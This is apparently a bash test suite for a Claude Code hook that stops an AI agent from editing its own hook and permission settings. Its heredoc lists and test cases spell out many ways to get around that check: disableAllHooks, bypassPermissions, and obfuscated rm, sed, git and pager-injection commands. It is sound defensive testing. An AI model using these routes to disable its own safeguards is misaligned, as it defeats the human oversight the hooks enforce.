#!/usr/bin/env bash
. "$(dirname -- "$0")/self-test-env.sh" || exit 1
# test-settings-edit-guard.sh — the agent's tools cannot change which hooks run (spec 089).
#
#   089-AC-1  an Edit that removes a hook, a Write that adds disableAllHooks, a MultiEdit that breaks
#             the JSON: each denied, naming the file and the developer's two routes
#   089-AC-2  settings.local.json created with env SPEC_ACCEPTANCE=off is denied; with only
#             permissions it is allowed in silence
#   089-AC-3  sed -i, rm, cd .claude && mv, printf > ~/.claude/settings.json are denied without echoing;
#             jq, git add, grep reads are allowed
#   089-AC-4  a re-indent and a permissions.allow entry are allowed
#   089-AC-5  bash-write-guard hands a tee write and a python3 -c naming the file to this guard
#   095a-AC-1..4  a mod (a plugin folder) is refused on every write route and open to reads
#
# Every arm runs the real hook with the payload Claude Code sends and reads the verdict the way the CLI
# does (hook-verdict.sh). Sabotage arms replace one rule of the verdict and require the attack it
# stops to pass, so the arm that denies it is about that rule.
#
# Exit 0 = every assertion held. Exit 1 = a real failure.

set -u

SELF_DIR=$(cd "$(dirname "$0")" && pwd)
. "$SELF_DIR/hook-verdict.sh"
GUARD="$SELF_DIR/settings-edit-guard-hook.sh"
BASHGUARD="$SELF_DIR/bash-write-guard-hook.sh"
BASH_BIN=$(command -v bash)
PASS=0; FAIL=0
ok()   { PASS=$((PASS+1)); printf '  ok    %s\n' "$*"; }
bad()  { FAIL=$((FAIL+1)); printf '  FAIL  %s\n' "$*"; }

command -v jq >/dev/null 2>&1 || { echo "jq is required"; exit 1; }
command -v python3 >/dev/null 2>&1 || { echo "python3 is required"; exit 1; }

WORK=$(mktemp -d 2>/dev/null || mktemp -d -t settingsguard)
WORK=$(cd -P "$WORK" && pwd)
trap 'rm -rf "$WORK"' EXIT
export HOME="$WORK/home"; mkdir -p "$HOME/.claude"
unset CLAUDE_CONFIG_DIR

P="$WORK/proj"
mkdir -p "$P/.claude" "$P/docs" "$P/scripts" "$P/sub"
git init -q "$P"
cat > "$P/.claude/settings.json" <<'EOF'
{
  "permissions": {
    "allow": ["Bash"]
  },
  "env": {
    "SPEC_INTERVIEW_MODE": "auto"
  },
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Edit|Write",
        "hooks": [
          { "type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR/scripts/spec-interview-guard-hook.sh\"" },
          { "type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR/scripts/trust-anchor-guard-hook.sh\"" }
        ]
      }
    ]
  }
}
EOF
printf '{ "hooks": {} }\n' > "$HOME/.claude/settings.json"
S="$P/.claude/settings.json"
L="$P/.claude/settings.local.json"
G="$HOME/.claude/settings.json"

# run <guard> <payload> -> OUT, VERDICT   (CLAUDE_PROJECT_DIR is the fixture project)
# A guard answers through JSON and always exits 0: a non-zero exit is a hook error the CLI reports instead
# of the decision (F099), so every run asserts it.
run() {
  OUT=$(printf '%s' "$2" | (cd "$P" && CLAUDE_PROJECT_DIR="$P" "$BASH_BIN" "$1") 2>/dev/null); RC=$?
  VERDICT=$(hook_verdict "$OUT")
  [ "$RC" -eq 0 ] || { bad "exit $RC from $(basename "$1") (a guard always exits 0)"; VERDICT="exit$RC"; }
}
reason() { printf '%s' "$OUT" | jq -r '.hookSpecificOutput.permissionDecisionReason // ""' 2>/dev/null; }
expect() { [ "$VERDICT" = "$2" ] && ok "$1" || { bad "$1 (want $2, got $VERDICT)"; }; }
bash_p()  { jq -cn --arg c "$1" --arg w "${2:-$P}" '{tool_name:"Bash",tool_input:{command:$c},cwd:$w}'; }
write_p() { jq -cn --arg p "$1" --arg c "$2" --arg w "$P" '{tool_name:"Write",tool_input:{file_path:$p,content:$c},cwd:$w}'; }
edit_p()  { jq -cn --arg p "$1" --arg o "$2" --arg n "$3" --arg w "$P" '{tool_name:"Edit",tool_input:{file_path:$p,old_string:$o,new_string:$n},cwd:$w}'; }
multi_p() { jq -cn --arg p "$1" --argjson e "$2" --arg w "$P" '{tool_name:"MultiEdit",tool_input:{file_path:$p,edits:$e},cwd:$w}'; }
routes() { case "$(reason)" in *"by hand"*'`!`'*) ok "  the reason names both developer routes" ;; *) bad "  the reason lacks the developer routes" ;; esac; }

HOOK_LINE='          { "type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR/scripts/trust-anchor-guard-hook.sh\"" }'

printf '\n[R3] the Edit route, judged on the bytes  (089-AC-1)\n'
run "$GUARD" "$(edit_p "$S" ",
$HOOK_LINE" "")"
expect "089-AC-1 Edit removing a hook entry" deny
case "$(reason)" in *"$S"*) ok "  the reason names the file" ;; *) bad "  the reason does not name the file" ;; esac
case "$(reason)" in *hooks*) ok "  and the key" ;; *) bad "  the key is not named" ;; esac
routes
run "$GUARD" "$(write_p "$S" "$(jq '. + {disableAllHooks: true}' "$S")")"
expect "089-AC-1 Write adding disableAllHooks" deny
routes
run "$GUARD" "$(multi_p "$S" '[{"old_string":"\"allow\": [\"Bash\"]","new_string":"\"allow\": [\"Bash\", \"Read\"]"},{"old_string":"\n}\n","new_string":"\n"}]')"
expect "089-AC-1 MultiEdit leaving invalid JSON" deny
case "$(reason)" in *"JSON object"*) ok "  the reason says why" ;; *) bad "  the reason does not say the JSON breaks" ;; esac
routes
run "$GUARD" "$(edit_p "$S" '"SPEC_INTERVIEW_MODE": "auto"' '"SPEC_INTERVIEW_MODE": "auto", "SPEC_ACCEPTANCE": "off"')"
expect "Edit adding an env entry" deny
run "$GUARD" "$(edit_p "$S" 'trust-anchor-guard-hook.sh' 'true.sh')"
expect "Edit rewriting a hook command" deny
run "$GUARD" "$(write_p "$S" '{"permissions":{"allow":["Bash"]}}')"
expect "Write dropping hooks and env wholesale" deny
run "$GUARD" "$(jq -cn --arg p "$S" '{tool_name:"Edit",tool_input:{file_path:$p,old_string:"\"PreToolUse\"",new_string:"\"PreToolUseX\"",replace_all:true},cwd:"/"}')"
expect "replace_all renaming the event" deny
run "$GUARD" "$(edit_p "$G" '{ "hooks": {} }' '{ "hooks": {}, "disableAllHooks": true }')"
expect "~/.claude/settings.json disableAllHooks" deny
run "$GUARD" "$(jq -cn --arg p "$S" '{tool_name:"NotebookEdit",tool_input:{notebook_path:$p,new_source:"{}"}}')"
expect "NotebookEdit on settings.json" deny

printf '\n[R1] spellings of the same file\n'
run "$GUARD" "$(edit_p ".claude/settings.json" '"auto"' '"manual"')";          expect "relative path" deny
run "$GUARD" "$(edit_p "$P/docs/../.claude/settings.json" '"auto"' '"manual"')"; expect "a .. path" deny
case "$(uname -s)" in
  Darwin*|MINGW*|MSYS*|CYGWIN*)
    run "$GUARD" "$(edit_p "$P/.CLAUDE/Settings.JSON" '"auto"' '"manual"')";   expect "another case on a case-folding file system" deny ;;
esac
ln -s "$S" "$P/docs/notes.json"
run "$GUARD" "$(edit_p "$P/docs/notes.json" '"auto"' '"manual"')";             expect "a symlink with an innocent name" deny
ln "$S" "$P/docs/hard.json"
run "$GUARD" "$(edit_p "$P/docs/hard.json" '"auto"' '"manual"')";              expect "a hard link with an innocent name" deny
rm -f "$P/docs/hard.json"
CFG="$WORK/cfg"; mkdir -p "$CFG"; printf '{}\n' > "$CFG/settings.json"
OUT=$(edit_p "$CFG/settings.json" '{}' '{"disableAllHooks":true}' | (cd "$P" && CLAUDE_PROJECT_DIR="$P" CLAUDE_CONFIG_DIR="$CFG" "$BASH_BIN" "$GUARD") 2>/dev/null); VERDICT=$(hook_verdict "$OUT")
expect "CLAUDE_CONFIG_DIR moves the user settings" deny
run "$GUARD" "$(write_p "$P/.claude/s*.json" '{}')";                            expect "a glob path (a delegated shell write)" deny
run "$GUARD" "$(jq -cn --arg p "$S" '{tool_name:"Write",tool_input:{file_path:$p}}')"; expect "a path with no bytes" deny

printf '\n[R2] settings.local.json  (089-AC-2)\n'
run "$GUARD" "$(write_p "$L" '{"env":{"SPEC_ACCEPTANCE":"off"}}')"
expect "089-AC-2 creating settings.local.json with env" deny
run "$GUARD" "$(write_p "$L" '{"permissions":{"allow":["Bash(git status)"]}}')"
expect "089-AC-2 creating it with only permissions" none
[ -z "$OUT" ] && ok "  in silence" || bad "  the allow says something"
run "$GUARD" "$(write_p "$L" '{"env":{"ALLOW_CORE_MACHINERY_EDIT":"1"}}')";     expect "env ALLOW_CORE_MACHINERY_EDIT" deny

printf '\n[R2] what stays editable  (089-AC-4)\n'
run "$GUARD" "$(write_p "$S" "$(jq -c . "$S")")"
expect "089-AC-4 a re-indent (minified)" none
run "$GUARD" "$(edit_p "$S" '"allow": ["Bash"]' '"allow": ["Bash", "Read(./docs/**)"]')"
expect "089-AC-4 a permissions.allow entry" none
run "$GUARD" "$(write_p "$S" "$(jq '. + {language: "english"}' "$S")")"; expect "language (outputStyle left the safe list in 095 TB2)" none
run "$GUARD" "$(edit_p "$S" 'no such text' 'x')";                               expect "an Edit that would fail in the tool" none
run "$GUARD" "$(write_p "$WORK/other/.claude/settings.json" '{"disableAllHooks":true}')"; expect "another project's settings (O1)" none
run "$GUARD" "$(edit_p "$P/docs/guide.md" 'a' 'settings.json hooks')";         expect "a doc that mentions settings.json" none

printf '\n[R3] what cannot be judged is refused\n'
printf '{ "hooks": ' > "$L"
run "$GUARD" "$(edit_p "$L" '{' '{ ')";                                        expect "a current file that is not JSON" deny
rm -f "$L"
run "$GUARD" "$(write_p "$S" "$(jq '. + {x: 1}' "$S" | sed 's/"x": 1/"x": NaN/')")"; expect "NaN, which JSON.parse rejects" deny
run "$GUARD" "$(edit_p "$S" '"auto"' '"auto", "n": Infinity')";               expect "Infinity" deny
printf '{"env":{"X":1}}\n' > "$L"
run "$GUARD" "$(write_p "$L" '{"env":{"X":true}}')";                            expect "env 1 -> true is a change (True == 1 in Python)" deny
rm -f "$L"
run "$GUARD" "$(edit_p "$S" '"auto"' '“manual”')";                             expect "a smart-quote edit that does change env" deny
run "$GUARD" "$(edit_p "$S" '“auto”' '"manual"')";                             expect "a quote-normalised match is not simulated" deny

printf '\n[R4] the shell route  (089-AC-3)\n'
SECRET="hunter2-SECRET-TOKEN"
run "$GUARD" "$(bash_p "sed -i '' 's/auto/manual/' .claude/settings.json # $SECRET")"
expect "089-AC-3 sed -i" deny
case "$(reason)" in *"$SECRET"*) bad "  the reason echoes the command" ;; *) ok "  the reason does not echo the command" ;; esac
run "$GUARD" "$(bash_p "rm .claude/settings.local.json")";                        expect "089-AC-3 rm settings.local.json" deny
run "$GUARD" "$(bash_p "cd .claude && mv settings.json x")";                      expect "089-AC-3 cd .claude && mv settings.json" deny
run "$GUARD" "$(bash_p "printf '{}' > ~/.claude/settings.json")";                 expect "089-AC-3 printf > ~/.claude/settings.json" deny
for c in "jq .hooks .claude/settings.json" "git add .claude/settings.json" "grep -n env .claude/settings.local.json"; do
  run "$GUARD" "$(bash_p "$c")"; expect "089-AC-3 read: ${c%% *}" none
done
while IFS= read -r c; do
  [ -n "$c" ] || continue
  run "$GUARD" "$(bash_p "$c")"; expect "deny: $c" deny
done <<'EOF'
echo '{}' > .claude/settings.json
echo x >> .claude/settings.local.json
cat /tmp/x | tee .claude/settings.json
cp /tmp/evil.json .claude/settings.json
cp /tmp/evil.json .claude/
mv .claude .claude.off
rm -rf .claude
ln -sf /tmp/evil.json .claude/settings.json
touch .claude/settings.local.json
truncate -s 0 .claude/settings.json
git checkout -- .claude/settings.json
git restore .claude/settings.json
python3 -c "import json; json.dump({}, open('.claude/settings.json','w'))"
bash -c "rm .claude/settings.json"
sh -c 'cd .claude; rm settings.json'
eval "rm .claude/settings.json"
rm .c*/s*.json
rm .claude/settings.{json,local.json}
rm $'\x2eclaude/settings.json'
rm .cl""aude/sett\ings.json
rm "$HOME/.claude/settings.json"
rm ${HOME}/.claude/settings.json
rm "$CLAUDE_PROJECT_DIR/.claude/settings.json"
f=sett; rm .claude/${f}ings.json
cd .claude && rm -f *
cd .claude; cp /tmp/x .
pushd .claude && rm settings.local.json
cd sub && rm ../.claude/settings.json
git -C .claude checkout settings.json
find . -name settings.json -delete
ls | xargs rm settings.json
git diff --output=.claude/settings.json
git diff -o .claude/settings.json
cat > .claude/settings.json <<'JSON'
dd if=/dev/null of=.claude/settings.json
echo x >| .claude/settings.json
cat x 1<> .claude/settings.json
rm .claude/settings.json'unbalanced
cat /tmp/x > >(tee .claude/settings.json)
echo `rm .claude/settings.json`
echo $(rm .claude/settings.json)
LESSOPEN='|sed -i s/a/b/ %s' less .claude/settings.json
GIT_EXTERNAL_DIFF=./x.sh git diff .claude/settings.json
git -c core.pager='tee x' log .claude/settings.json
rg --pre ./x.sh hooks .claude/settings.json
p=.claude/settings.json; sed -i '' s/a/b/ "$p"
f=.claude/settings.local.json && echo '{"env":{"SPEC_ACCEPTANCE":"off"}}' > $f
export p=.claude/settings.json
p=$(echo .claude/settings.json); rm "$p"
echo .claude/settings.json | xargs rm
echo "rm .claude/settings.json" | sh
cat .claude/settings.json > >(sh)
rm $(printf .claude/settings.json)
EOF
run "$GUARD" "$(bash_p "rm settings.json" "$P/.claude")";                        expect "deny: rm settings.json with cwd inside .claude" deny
while IFS= read -r c; do
  [ -n "$c" ] || continue
  run "$GUARD" "$(bash_p "$c")"; expect "allow: $c" none
done <<'EOF'
cat .claude/settings.json
head -40 .claude/settings.json
python3 -m json.tool .claude/settings.json > /dev/null
python3 -m json.tool .claude/settings.json >/dev/null 2>&1 || echo invalid
jq -r '.hooks | keys' .claude/settings.json
git diff .claude/settings.json
git log --oneline -- .claude/settings.json
git show HEAD:.claude/settings.json
git commit -m "docs: say who edits .claude/settings.json"
git status --short
ls -la .claude
grep -rn "settings.json" scripts/
grep -q "trust-anchor-guard-hook.sh" .claude/settings.json && echo wired
cd sub && cp ../docs/a.md .
find . -name '*.py' | head
python3 scripts/sync-core-hooks.py "$TEMPLATE/.claude/settings.json"
bash scripts/test-settings-edit-guard.sh
rm -rf .claude/worktrees/old
mkdir -p .claude/agents
EOF

run "$GUARD" "$(bash_p "python3 - <<'PY'
open('.claude/settings.json', 'w').write('{}')
PY")";                                                                          expect "deny: a python3 heredoc whose body names settings.json" deny
run "$GUARD" "$(bash_p "cat > docs/settings-notes.md <<'MD'
The hooks live in .claude/settings.json and the developer edits them.
MD")";                                                                          expect "allow: a heredoc doc that mentions settings.json" none
run "$GUARD" "$(bash_p "git commit -F - <<'MSG'
feat: guard .claude/settings.json
MSG")";                                                                         expect "allow: a commit message heredoc naming settings.json" none
run "$GUARD" "$(bash_p "python3 <<\EOF
p = '.claude/settings.json'
EOF")";                                                                         expect "deny: <<\\EOF, a backslash-quoted delimiter" deny
run "$GUARD" "$(bash_p "python3 <<E\OF
p = '.claude/settings.json'
EOF")";                                                                         expect "deny: <<E\\OF, a partly quoted delimiter" deny
run "$GUARD" "$(bash_p "cat x
rm .claude/settings.json")";                                                    expect "deny: a write on the second line" deny

printf '\n[R5] the bash-write-guard route  (089-AC-5)\n'
OUT=$(bash_p "echo '{}' | tee .claude/settings.json" | (cd "$P" && CLAUDE_PROJECT_DIR="$P" "$BASH_BIN" "$BASHGUARD") 2>/dev/null)
VERDICT=$(hook_verdict "$OUT"); expect "089-AC-5 tee into settings.json is denied by bash-write-guard" deny
case "$(reason)" in *settings-edit-guard-hook.sh*) ok "  and names the settings delegate" ;; *) bad "  the delegate is not named" ;; esac
OUT=$(bash_p "python3 -c \"open('.claude/settings.json','w').write('{}')\"" | (cd "$P" && CLAUDE_PROJECT_DIR="$P" "$BASH_BIN" "$BASHGUARD") 2>/dev/null)
VERDICT=$(hook_verdict "$OUT"); expect "089-AC-5 python3 -c naming settings.json is denied by bash-write-guard" deny
case "$(reason)" in *settings-edit-guard-hook.sh*) ok "  and names the settings delegate" ;; *) bad "  the delegate is not named" ;; esac

printf '\n[R6] pre-check, fail closed, repair path\n'
NOPY="$WORK/nopy"; mkdir -p "$NOPY"
for d in $(printf '%s' "$PATH" | tr ':' ' '); do for f in "$d"/*; do n=${f##*/}; [ "$n" = python3 ] && continue; [ -x "$f" ] && [ ! -e "$NOPY/$n" ] && ln -s "$f" "$NOPY/$n" 2>/dev/null; done; done
OUT=$(bash_p "ls -la" | (cd "$P" && PATH="$NOPY" CLAUDE_PROJECT_DIR="$P" "$BASH_BIN" "$GUARD") 2>/dev/null); VERDICT=$(hook_verdict "$OUT")
expect "a plain command never wakes the verdict (no python3 needed)" none
printf 'x\n' > "$P/scripts/x.sh"
OUT=$(edit_p "$P/scripts/x.sh" a b | (cd "$P" && PATH="$NOPY" CLAUDE_PROJECT_DIR="$P" "$BASH_BIN" "$GUARD") 2>/dev/null); RC=$?; VERDICT=$(hook_verdict "$OUT")
[ "$RC" -eq 0 ] || bad "exit $RC on an unrelated Edit"
expect "an unrelated Edit of an existing file (not a hard link) never wakes the verdict" none
OUT=$(edit_p "$S" '"auto"' '"auto"' | (cd "$P" && PATH="$NOPY" CLAUDE_PROJECT_DIR="$P" "$BASH_BIN" "$GUARD") 2>/dev/null); VERDICT=$(hook_verdict "$OUT")
expect "without python3 a settings edit is denied" deny
OUT=$(edit_p "$P/scripts/settings-edit-guard-hook.sh" a b | (cd "$P" && PATH="$NOPY" CLAUDE_PROJECT_DIR="$P" "$BASH_BIN" "$GUARD") 2>/dev/null); RC=$?; VERDICT=$(hook_verdict "$OUT")
[ "$RC" -eq 0 ] || bad "exit $RC on the repair path"
expect "without python3 the guard's own file stays editable" none
case "$OUT" in *"ALLOWED this edit unchecked"*) ok "  and says so" ;; *) bad "  the allow is silent" ;; esac
run "$GUARD" '';                                                               expect "an empty payload" none
LONE="$WORK/lone"; mkdir -p "$LONE"; cp "$GUARD" "$SELF_DIR/settings_guard.py" "$LONE"/
run "$LONE/settings-edit-guard-hook.sh" "$(edit_p "$S" '"auto"' '"manual"')"; expect "without guard-lib.sh a settings edit is denied" deny
run "$GUARD" '{"tool_name":"Bash","tool_input":{"command":"rm .claude/settings.json"'
expect "a truncated payload naming a settings file" deny

printf '\n[090 R8c] a glob keeps to one path component, as the shell does\n'
PYHD=$'python3 - <<\'X\'\nprint(2 * 3)\nX'
run "$GUARD" "$(bash_p "$PYHD")";                                expect "an interpreter heredoc with a * in its program is allowed (found 2026-10-02)" none
run "$GUARD" "$(bash_p "$(printf 'cd %s && python3 - <<%sX%s\nf(*args)\nX' "$P" "'" "'")")"; expect "the same after a cd into the project" none
run "$GUARD" "$(bash_p "rm .claude/*.json")";                     expect "control: rm .claude/*.json still names the settings file" deny
run "$GUARD" "$(bash_p "rm -r .c*")";                             expect "control: rm -r .c* still names .claude" deny
run "$GUARD" "$(bash_p "rm -r *")";                               expect "control: rm -r * does not reach a dot directory (the shell's rule)" none
run "$GUARD" "$(bash_p "shopt -s dotglob; rm -r *")";           expect "review #8: with dotglob, rm -r * reaches .claude" deny
run "$GUARD" "$(bash_p "shopt -s dotglob; rm */settings.json")"; expect "review #8: with dotglob, */settings.json reaches .claude/settings.json" deny
run "$GUARD" "$(bash_p "shopt -s globstar; rm .claude/**/settings.json")"; expect "review #8: with globstar, **/ also matches no directory" deny
run "$GUARD" "$(bash_p "shopt -s dot''glob; cp e.json */settings.json")"; expect "/security-review: a quoted dot''glob still turns the loose match on" deny
run "$GUARD" "$(bash_p "shopt -s \$'\\x64otglob'; cp e.json */settings.json")"; expect "/security-review: an ANSI-C spelled dotglob too" deny
run "$GUARD" "$(bash_p "bash -O dotglob -c 'rm */settings.json'")"; expect "/security-review: bash -O dotglob" deny
run "$GUARD" "$(bash_p "echo x > .cla{u..u}de/settings.json")"; expect "/simplify: a brace sequence (.cla{u..u}de) is expanded like bash does" deny
run "$GUARD" "$(bash_p "echo x > .claude/s{e..e}ttings.json")"; expect "a brace sequence inside the name" deny
run "$GUARD" "$(bash_p "echo x > out{1..9999}.txt")";            expect "control: a huge sequence naming no settings file" none
MG="$WORK/mutglob"; mkdir -p "$MG"; cp "$SELF_DIR"/*.sh "$SELF_DIR"/*.py "$MG"/ 2>/dev/null
python3 - "$MG/settings_guard.py" <<'PY' || bad "sabotage target not found (shell_glob_match)"
import sys
p = sys.argv[1]; s = open(p).read()
old = '    ps, qs = path.split("/"), pat.split("/")\n'
if old not in s: sys.exit(1)
open(p, "w").write(s.replace(old, '    return fnmatch.fnmatchcase(path, pat)\n' + old, 1))
PY
run "$MG/settings-edit-guard-hook.sh" "$(bash_p "$PYHD")"; expect "sabotage: fnmatch across / denies the interpreter heredoc again" deny

printf '\n[095-R2] every key outside the safe list is guarded  (095-AC-2)\n'
SD="$P/.claude/settings.json"
run "$GUARD" "$(write_p "$SD" "$(jq '. + {apiKeyHelper: "/tmp/k.sh"}' "$SD")")";             expect "095-AC-2 adding apiKeyHelper" deny
case "$(reason)" in *apiKeyHelper*) ok "  the reason names the key" ;; *) bad "  the key is not named" ;; esac
run "$GUARD" "$(write_p "$SD" "$(jq '. + {statusLine: {type: "command", command: "x"}}' "$SD")")"; expect "095-AC-2 adding statusLine" deny
run "$GUARD" "$(write_p "$SD" "$(jq '. + {enabledPlugins: {"x@y": true}}' "$SD")")";          expect "095-AC-2 adding enabledPlugins" deny
run "$GUARD" "$(write_p "$SD" "$(jq '.permissions.deny = ["Bash(rm -rf *)"]' "$SD")")";       expect "control: adding permissions.deny" deny
run "$GUARD" "$(write_p "$SD" "$(jq '.permissions.deny = ["Bash(rm -rf *)"] | .permissions.allow += ["Read"]' "$SD")")"
expect "095-AC-2 removing a permissions.deny entry (seen from a file that has one)" deny
case "$(reason)" in *permissions.deny*) ok "  the reason names permissions.deny" ;; *) bad "  permissions.deny is not named" ;; esac
run "$GUARD" "$(edit_p "$SD" '"allow": ["Bash"]' '"allow": ["Bash", "Read"]')";             expect "095-AC-2 adding a permissions.allow entry" none
run "$GUARD" "$(write_p "$SD" "$(jq '. + {language: "swedish"}' "$SD")")";                    expect "095-AC-2 changing language" none
run "$GUARD" "$(write_p "$SD" "$(jq '. + {outputStyle: "Explanatory"}' "$SD")")";             expect "TB2: outputStyle is guarded" deny
run "$GUARD" "$(write_p "$SD" "$(jq '. + {cleanupPeriodDays: 0}' "$SD")")";                   expect "TB2: cleanupPeriodDays is guarded" deny
run "$GUARD" "$(write_p "$SD" "$(jq '. + {attribution: {commit: ""}}' "$SD")")";             expect "TB2: attribution is guarded" deny
run "$GUARD" "$(write_p "$SD" "$(jq '.permissions.defaultMode = "bypassPermissions"' "$SD")")"; expect "permissions.defaultMode is guarded" deny
run "$GUARD" "$(write_p "$L" '{"enableAllProjectMcpServers":true}')";                        expect "settings.local.json enableAllProjectMcpServers" deny
run "$GUARD" "$(write_p "$SD" "$(jq '.permissions = "x"' "$SD")")";                            expect "permissions replaced by a non-object" deny

printf '\n[095-R7 R8] reads are trusted only in a clean command  (095-AC-5, settings half)\n'
run "$GUARD" "$(bash_p "export GIT_EXTERNAL_DIFF=/tmp/x; git diff .claude/settings.json")"; expect "095-AC-5 an exported GIT_EXTERNAL_DIFF before git diff" deny
run "$GUARD" "$(bash_p 'cat() { cp /tmp/x "$1"; }; cat .claude/settings.json')";             expect "095-AC-5 a function named cat before cat" deny
run "$GUARD" "$(bash_p "PAGER=/tmp/x; git log .claude/settings.json")";                     expect "a bare assignment before a read" deny
run "$GUARD" "$(bash_p "set -a; LESSOPEN='|/tmp/x %s'; less .claude/settings.json")";        expect "set -a then less" deny
run "$GUARD" "$(bash_p "alias cat=/tmp/x; cat .claude/settings.json")";                     expect "an alias before cat" deny
run "$GUARD" "$(bash_p "source /tmp/env.sh && jq . .claude/settings.json")";                expect "a sourced file before jq" deny
run "$GUARD" "$(bash_p "./cat .claude/settings.json")";                                     expect "threat model: ./cat is the agent's program" deny
run "$GUARD" "$(bash_p "/usr/bin/grep -n hooks .claude/settings.json")";                    expect "control: /usr/bin/grep reads" none
run "$GUARD" "$(bash_p "sed -n 1,5p .claude/settings.json")";                               expect "095-AC-5 sed -n 1,5p reads" none
run "$GUARD" "$(bash_p "sed 's/a/b/' .claude/settings.json | head")";                       expect "sed s/// to stdout reads" none
run "$GUARD" "$(bash_p "sed --in-pl '/hooks/d' .claude/settings.json")";                    expect "threat model: --in-pl is GNU's --in-place" deny
run "$GUARD" "$(bash_p "sed -n '1w .claude/settings.json' notes.txt")";                     expect "a sed w command naming the file" deny
run "$GUARD" "$(bash_p "sed -n -f x.sed .claude/settings.json")";                           expect "a sed script from a file is not read" deny
run "$GUARD" "$(bash_p "git diff -- scripts .claude/ | tail -5")";                          expect "F145: git diff -- scripts <settings-dir> | tail" none
run "$GUARD" "$(bash_p "find scripts -name x | xargs grep -o '[a-z]*' | head")";            expect "F145: grep's pattern behind xargs is not a file name" none
run "$GUARD" "$(bash_p "cd .claude && ls | grep 'sett.*' | xargs rm")";                    expect "control: inside .claude a pattern still counts" deny

printf '\n[095-R1] git verbs that rewrite the tree  (095-AC-1)\n'
GC="git -c user.email=t@example.invalid -c user.name=t -c commit.gpgsign=false"
printf '.claude/settings.local.json\n' > "$P/.gitignore"
jq 'del(.hooks)' "$SD" > "$WORK/nohooks.json"
cp "$SD" "$WORK/withhooks.json"
cp "$WORK/nohooks.json" "$SD"
(cd "$P" && git add .gitignore .claude/settings.json && $GC commit -qm old) || bad "fixture: first commit"
REV=$(git -C "$P" rev-parse HEAD)
cp "$WORK/withhooks.json" "$SD"
(cd "$P" && git add .claude/settings.json && $GC commit -qm hooks) || bad "fixture: second commit"
run "$GUARD" "$(bash_p "git checkout $REV -- .")";              expect "095-AC-1 git checkout REV -- ." deny
case "$(reason)" in *"$SD"*) ok "  the reason names the settings file" ;; *) bad "  the file is not named: $(reason | head -1)" ;; esac
run "$GUARD" "$(bash_p "git restore --source=$REV .")";         expect "095-AC-1 git restore --source=REV ." deny
run "$GUARD" "$(bash_p "git apply $WORK/p.diff")"
(cd "$P" && git diff "$REV" HEAD > "$WORK/p.diff")
run "$GUARD" "$(bash_p "git apply $WORK/p.diff")";              expect "095-AC-1 git apply of a patch that touches the settings file" deny
cp "$WORK/nohooks.json" "$SD"; (cd "$P" && $GC stash -q) || bad "fixture: stash"
run "$GUARD" "$(bash_p "git stash pop")";                        expect "095-AC-1 git stash pop of a stash that removes the hook" deny
run "$GUARD" "$(bash_p "git checkout HEAD -- .")";               expect "095-AC-1 git checkout HEAD -- . with an unchanged file" none
[ -z "$OUT" ] && ok "  with no output" || bad "  the allow says something"
run "$GUARD" "$(bash_p "git switch -c topic")";                  expect "095-AC-1 git switch -c topic" none
run "$GUARD" "$(bash_p "git checkout $REV -- docs")";           expect "a pathspec that leaves .claude out" none
run "$GUARD" "$(bash_p "git checkout $REV")";                   expect "a branch switch to REV" deny
run "$GUARD" "$(bash_p "git reset --hard $REV")";               expect "git reset --hard REV" deny
run "$GUARD" "$(bash_p "git reset $REV")";                      expect "control: a mixed reset writes only the index" none
run "$GUARD" "$(bash_p "git restore --staged .")";              expect "restore --staged alone writes only the index" none
run "$GUARD" "$(bash_p "git revert HEAD")";                     expect "git revert of the commit that added the hooks" deny
run "$GUARD" "$(bash_p "git cherry-pick HEAD")";                expect "control: cherry-picking a change already there" none
(cd "$P" && git branch -q old "$REV" && git checkout -q old 2>/dev/null && printf 'x\n' > "$P/docs/a.txt" && git add docs/a.txt && $GC commit -qm a && git checkout -q - 2>/dev/null) || bad "fixture: branch old"
run "$GUARD" "$(bash_p "git merge old")";                       expect "control: merging a branch that did not change the file since the base" none
(cd "$P" && git checkout -q old 2>/dev/null && jq '. + {env: {SPEC_ACCEPTANCE: "off"}}' "$WORK/nohooks.json" > "$SD" && git add .claude/settings.json && $GC commit -qm env && git checkout -q - 2>/dev/null) || bad "fixture: env on old"
run "$GUARD" "$(bash_p "git merge old")";                       expect "git merge of a branch that adds env" deny
run "$GUARD" "$(bash_p "git rebase old")";                      expect "git rebase onto it" deny
run "$GUARD" "$(bash_p "git cherry-pick old")";                 expect "git cherry-pick of that commit" deny
run "$GUARD" "$(bash_p "git merge --abort")";                   expect "control: merge --abort" none
run "$GUARD" "$(bash_p "git pull . old")";                      expect "threat model: git pull . old is a local merge" deny
run "$GUARD" "$(bash_p "git pull $WORK/forge main")";           expect "threat model: a pull from a path is not origin" deny
git -C "$P" remote add origin "https://example.invalid/origin.git" 2>/dev/null
run "$GUARD" "$(bash_p "git pull origin main")";                expect "O3: a pull from a configured remote is allowed" none
run "$GUARD" "$(bash_p "git pull")";                            expect "O3: a bare pull is allowed" none
git -C "$P" remote add local "$WORK/origin.git" 2>/dev/null
run "$GUARD" "$(bash_p "git pull local main")";                 expect "095a TM-14: a configured remote whose URL is a path" deny
run "$GUARD" "$(bash_p "git -c url.$WORK/.insteadOf=https://example.invalid/ pull origin main")"; expect "095a TM-14: insteadOf on the command line (git -c)" deny
git -C "$P" config alias.co checkout
run "$GUARD" "$(bash_p "git co $REV -- .")";                    expect "threat model: an alias for checkout" deny
run "$GUARD" "$(bash_p "git update-ref refs/heads/safe $REV && git checkout safe -- .")"; expect "threat model: a ref moved on the same line" deny
run "$GUARD" "$(bash_p "git --git-dir=$P/.git --work-tree=$P checkout $REV -- .")"; expect "threat model: --git-dir/--work-tree" deny
run "$GUARD" "$(bash_p "GIT_WORK_TREE=$P git checkout $REV -- .")"; expect "threat model: a GIT_ prefix" deny
run "$GUARD" "$(bash_p "git -C $P checkout $REV -- .")";        expect "git -C <project>" deny
run "$GUARD" "$(bash_p "cd \$X && git checkout HEAD -- .")";    expect "a cd this guard cannot follow" deny
run "$GUARD" "$(bash_p "git status && git log -1")";            expect "control: reads only" none
printf '{"env":{"A":"1"}}\n' > "$L"
run "$GUARD" "$(bash_p "git clean -fdx")";                      expect "git clean -fdx removes settings.local.json" deny
run "$GUARD" "$(bash_p "git clean -fd")";                       expect "control: git clean -fd keeps an ignored file" none
run "$GUARD" "$(bash_p "git clean -n -x")";                     expect "control: a dry run" none
rm -f "$L"
